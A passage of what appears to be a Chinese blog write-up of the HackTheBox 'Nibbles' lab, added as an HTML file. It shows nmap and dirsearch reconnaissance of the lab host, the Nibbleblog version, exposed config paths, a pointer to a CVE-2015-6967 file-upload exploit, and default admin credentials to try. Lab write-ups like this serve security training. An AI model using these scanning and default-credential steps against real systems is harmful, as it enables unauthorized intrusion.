@@ -1,0 +1,787 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：网页源码查看、默认口令搜集、CVE-2015-6967、远程文件base64格式传输、LinEnum.sh工具使用、unzip文件解压、echo命令输出字符到bash脚本中 参考链接：无">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nibbles-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2023/12/04/Nibbles-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：网页源码查看、默认口令搜集、CVE-2015-6967、远程文件base64格式传输、LinEnum.sh工具使用、unzip文件解压、echo命令输出字符到bash脚本中 参考链接：无">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Nibbles-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nibbles-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nibbles-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nibbles-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nibbles-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nibbles-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nibbles-htb-writeup/7.png">
+<meta property="article:published_time" content="2023-12-04T15:50:55.000Z">
+<meta property="article:modified_time" content="2023-12-04T09:51:55.502Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Nibbles-htb-writeup/1.png">
+  
+  
+  
+  <title>Nibbles-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Nibbles-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-04 23:50" pubdate>
+          2023年12月4日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          119 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Nibbles-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：网页源码查看、默认口令搜集、CVE-2015-6967、远程文件base64格式传输、LinEnum.sh工具使用、unzip文件解压、echo命令输出字符到bash脚本中</p>
+<p>参考链接：无</p>
+<span id="more"></span>  
+
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、我们首先启动下靶机，获取下靶机IP地址：<strong>10.10.10.75</strong></p>
+<p>2、这里参照B站红笔up的方法进行端口扫描，加快下扫描进度</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -min-rate 10000 -p- 10.10.10.75<br>[sudo] kali 的密码：<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 15:21 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.75<br>Host is up (0.30s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.05 seconds<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -min-rate 10000 -p- -sU 10.10.10.75<br>[sudo] kali 的密码：<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 15:22 CST<br>Warning: 10.10.10.75 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.75<br>Host is up (0.30s latency).<br>All 65535 scanned ports on 10.10.10.75 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 75.33 seconds<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap -sT -sV -O -p22,80 10.10.10.75<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 15:25 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.75<br>Host is up (0.29s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 3.12 (96%), Linux 3.13 (96%), Linux 3.2 - 4.9 (96%), Linux 4.8 (96%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 16.03 seconds<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ sudo nmap --script=vuln -p22,80 10.10.10.75<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 15:25 CST<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">|_      http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 347.37 seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、这样的篇幅可能有点长，但是为了以后的OSCP，还是按照这个方法来吧。</p>
+<p>4、通过nmap扫描，并没有发现什么特别有用的信息，那就先看下80端口是什么服务吧。</p>
+<p><img src="http://sh1yan.top/photo/Nibbles-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、首页什么信息也没有，看下首页源代码吧</p>
+<p><img src="http://sh1yan.top/photo/Nibbles-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</code></p>
+<p>6、发现了一个目录路径，尝试访问下看看</p>
+<p><img src="http://sh1yan.top/photo/Nibbles-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>7、看着像是一个博客的网站，暂时首页看不出来什么，先目录扫描下吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ dirsearch -u http://10.10.10.75/nibbleblog/<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/kali/.dirsearch/reports/10.10.10.75/-nibbleblog-_23-12-04_15-58-43.txt<br><br>Error Log: /home/kali/.dirsearch/logs/errors-23-12-04_15-58-43.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.75/nibbleblog/<br><br>[15:58:44] Starting: <br>                         <br>[15:59:08] 200 -    1KB - /nibbleblog/COPYRIGHT.txt                         <br>[15:59:11] 200 -    5KB - /nibbleblog/README                                <br>[15:59:13] 200 -   34KB - /nibbleblog/LICENSE.txt                           <br>[15:59:20] 301 -  321B  - /nibbleblog/admin  -&gt;  http://10.10.10.75/nibbleblog/admin/<br>[15:59:21] 200 -    2KB - /nibbleblog/admin/                                <br>[15:59:21] 200 -    1KB - /nibbleblog/admin.php<br>[15:59:21] 403 -  312B  - /nibbleblog/admin/.htaccess                       <br>[15:59:21] 200 -    2KB - /nibbleblog/admin/?/login                         <br>[15:59:22] 301 -  332B  - /nibbleblog/admin/js/tinymce  -&gt;  http://10.10.10.75/nibbleblog/admin/js/tinymce/<br>[15:59:22] 200 -    2KB - /nibbleblog/admin/js/tinymce/                     <br>[15:59:47] 200 -    1KB - /nibbleblog/content/                              <br>[15:59:48] 301 -  323B  - /nibbleblog/content  -&gt;  http://10.10.10.75/nibbleblog/content/<br>[16:00:02] 200 -    3KB - /nibbleblog/index.php                             <br>[16:00:02] 200 -    3KB - /nibbleblog/index.php/login/                      <br>[16:00:02] 200 -   78B  - /nibbleblog/install.php                           <br>[16:00:04] 301 -  325B  - /nibbleblog/languages  -&gt;  http://10.10.10.75/nibbleblog/languages/<br>[16:00:20] 301 -  323B  - /nibbleblog/plugins  -&gt;  http://10.10.10.75/nibbleblog/plugins/<br>[16:00:20] 200 -    4KB - /nibbleblog/plugins/                              <br>[16:00:34] 301 -  322B  - /nibbleblog/themes  -&gt;  http://10.10.10.75/nibbleblog/themes/<br>[16:00:34] 200 -    2KB - /nibbleblog/themes/                               <br>[16:00:36] 200 -    2KB - /nibbleblog/update.php                            <br><br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p>8、这里发现了一个路径文件，查看下</p>
+<p><code>http://10.10.10.75/nibbleblog/README</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash">====== Nibbleblog ======<br>Version: v4.0.3<br>Codename: Coffee<br>Release <span class="hljs-built_in">date</span>: 2014-04-01<br><br>Site: http://www.nibbleblog.com<br>Blog: http://blog.nibbleblog.com<br>Help &amp; Support: http://forum.nibbleblog.com<br>Documentation: http://docs.nibbleblog.com<br><br>===== Social =====<br>* Twitter: http://twitter.com/nibbleblog<br>* Facebook: http://www.facebook.com/nibbleblog<br>* Google+: http://google.com/+nibbleblog<br><br>===== System Requirements =====<br>* PHP v5.2 or higher<br>* PHP module - DOM<br>* PHP module - SimpleXML<br>* PHP module - GD<br>* Directory â€œcontentâ€ writable by Apache/PHP<br><br>Optionals requirements<br><br>* PHP module - Mcrypt<br><br>===== Installation guide =====<br>1- Download the last version from http://nibbleblog.com<br>2- Unzip the downloaded file<br>3- Upload all files to your hosting or <span class="hljs-built_in">local</span> server via FTP, Shell, Cpanel, others.<br>4- With your browser, go to the URL of your web. Example: www.domain-name.com<br>5- Complete the form<br>6- Done! you have installed Nibbleblog<br><br>===== About the author =====<br>Name: Diego Najar<br>E-mail: dignajar@gmail.com<br>Linkedin: http://www.linkedin.com/in/dignajar<br><br>===== Example Post =====<br>&lt;h1&gt;Lorem ipsum dolor sit amet&lt;/h1&gt;<br>&lt;p&gt;ea tibique disputando qui. Utroque laboramus percipitur sea <span class="hljs-built_in">id</span>, no oporteat constituto mea? Dico iracundia mnesarchum cum an, cu vidit albucius prodesset his. Facer primis essent ut quo, ea vivendo legendos assueverit vel, ne sed nonumes percipitur? No usu agam volutpat!&lt;/p&gt;<br>&lt;h2&gt;An mutat docendi quo&lt;/h2&gt;<br>&lt;p&gt;nusquam apeirian constituam ius cu? Et mel eripuit noluisse scriptorem, habeo dissentiet te qui, at veniam impedit deterruisset eam. Ne mollis aliquam sea, te vis tation inimicus ullamcorper, cum illum invenire <span class="hljs-built_in">id</span>? Nam causae euripidis necessitatibus ex. Case ferri graece at vix. Usu platonem mediocritatem <span class="hljs-built_in">id</span>, ullum salutatus at sed.&lt;/p&gt;<br>&lt;ol&gt;<br>&lt;li&gt;&lt;strong&gt;Graecis explicari vim cu&lt;/strong&gt;. Vim simul tibique <span class="hljs-keyword">in</span>, bonorum officiis maluisset eam an? Ut senserit argumentum pri, mei ut unum tollit labores. Mea tation nusquam detracto et. Ius quis disputationi an!&lt;/li&gt;<br>&lt;li&gt;&lt;strong&gt;Cu ignota inermis pri&lt;/strong&gt;. Percipit sadipscing eu has. Ipsum laoreet suscipiantur nam <span class="hljs-keyword">in</span>, ius probo rebum explicari cu. Doming aliquam tractatos usu <span class="hljs-keyword">in</span>, sea tation feugiat adversarium te, at modus virtute antiopam per. Sit at ipsum atqui viderer, te vim dolores volutpat constituam.&lt;/li&gt;<br>&lt;/ol&gt;<br>&lt;p&gt;Eum malorum appellantur <span class="hljs-keyword">in</span>, qui ad contentiones consequuntur interpretaris. Cu aeque gloriatur scriptorem vim! Fugit admodum sed ne? Natum scripta intellegebat sit ut, aeque forensibus ei eam. Mazim delicata ius <span class="hljs-built_in">id</span>, usu at idque delicata perpetua. Mollis vidisse reprimique te has, oblique graecis voluptaria vis <span class="hljs-keyword">in</span>. Sed ea aliquam indoctum, duo at hinc mucius, ex iudicabit consulatu mel.&lt;/p&gt;<br>&lt;p&gt;Eu nisl debet convenire nam, et epicurei periculis democritum est, nam eu stet elitr oratio. Eam iriure virtute equidem <span class="hljs-keyword">in</span>, ei summo officiis dignissim nec! Et nam soleat fuisset, doming fastidii voluptatum ea ius, errem volutpat cum eu! Ex detracto assueverit cum. An eos graeco utamur, veri audire his no. Possit dissentias ei mei, quidam efficiantur delicatissimi est <span class="hljs-built_in">id</span>, vel iuvaret adipisci mnesarchum <span class="hljs-built_in">id</span>.&lt;/p&gt;<br>&lt;pre&gt;git <span class="hljs-built_in">clone</span> [git-repo-url] nibbleblog&lt;br /&gt;<span class="hljs-built_in">cd</span> nibbleblog&lt;br /&gt;npm i -d&lt;br /&gt;<span class="hljs-built_in">mkdir</span> -p public/files/&#123;md,html,pdf&#125;&lt;/pre&gt;<br>&lt;p&gt;An mutat docendi quo, nusquam apeirian constituam ius cu? Et mel eripuit noluisse scriptorem, habeo dissentiet te qui, at veniam impedit deterruisset eam. Ne mollis aliquam sea, te vis tation inimicus ullamcorper, cum illum invenire <span class="hljs-built_in">id</span>? Nam causae euripidis necessitatibus ex. Case ferri graece at vix. Usu platonem mediocritatem <span class="hljs-built_in">id</span>, ullum salutatus at sed.&lt;/p&gt;<br>&lt;p&gt;Graecis explicari vim cu. Vim simul tibique <span class="hljs-keyword">in</span>, bonorum officiis maluisset eam an? Ut senserit argumentum pri, mei ut unum tollit labores. Mea tation nusquam detracto et. Ius quis disputationi an!&lt;/p&gt;<br>&lt;pre&gt;&lt;code data-language=<span class="hljs-string">&quot;php&quot;</span>&gt;&amp;lt;?php<br>	<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello Nibbleblog&quot;</span>;<br>	<span class="hljs-variable">$tmp</span> = array(1,2,3);<br>	foreach(<span class="hljs-variable">$tmp</span> as <span class="hljs-variable">$number</span>)<br>		<span class="hljs-built_in">echo</span> <span class="hljs-variable">$number</span>;<br>?&amp;gt;&lt;/code&gt;&lt;/pre&gt;<br>&lt;h2&gt;How to install Git&lt;/h2&gt;<br>&lt;p&gt;An mutat docendi quo, nusquam apeirian constituam ius cu? Et mel eripuit noluisse scriptorem, habeo dissentiet te qui, at veniam impedit deterruisset eam. Ne mollis aliquam sea, te vis tation inimicus ullamcorper, cum illum invenire <span class="hljs-built_in">id</span>? Nam causae euripidis necessitatibus ex. Case ferri graece at vix. Usu platonem mediocritatem <span class="hljs-built_in">id</span>, ullum salutatus at sed.&lt;/p&gt;<br>&lt;pre class=<span class="hljs-string">&quot;nb-console&quot;</span>&gt;sudo yum install git&lt;/pre&gt;<br>&lt;p&gt;An mutat docendi quo, nusquam apeirian constituam ius cu? Et mel eripuit noluisse scriptorem, habeo dissentiet te qui, at veniam impedit deterruisset eam. Ne mollis aliquam sea, te vis tation inimicus ullamcorper.&lt;/p&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>9、至此，我们知道了两个重要信息，该cms是Nibbleblog，版本号是 v4.0.3</p>
+<p>10、通过目录扫描还获取到以下几个信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://10.10.10.75/nibbleblog/update.php<br>访问默认重置数据库<br><br>http://10.10.10.75/nibbleblog/content/private/config.xml<br>获取到两个信息：admin@nibbles.com 和 noreply@10.10.10.134<br></code></pre></td></tr></table></figure>
+
+<p>11、通过检索该 <code>nibbleblog 4.0.3 exploit github</code>关键词，我们发现了1个当前版本的文件上传的漏洞</p>
+<p><img src="http://sh1yan.top/photo/Nibbles-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>12、瞅了下这个漏洞是任意文件上传的漏洞，前提是获取到账号密码</p>
+<p><code>https://github.com/dix0nym/CVE-2015-6967</code></p>
+<p><img src="http://sh1yan.top/photo/Nibbles-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>13、看到这个exp里有个默认的账号密码，我们先试试把，看看这个账号密码对不对</p>
+<p><code>--username admin --password nibbles</code></p>
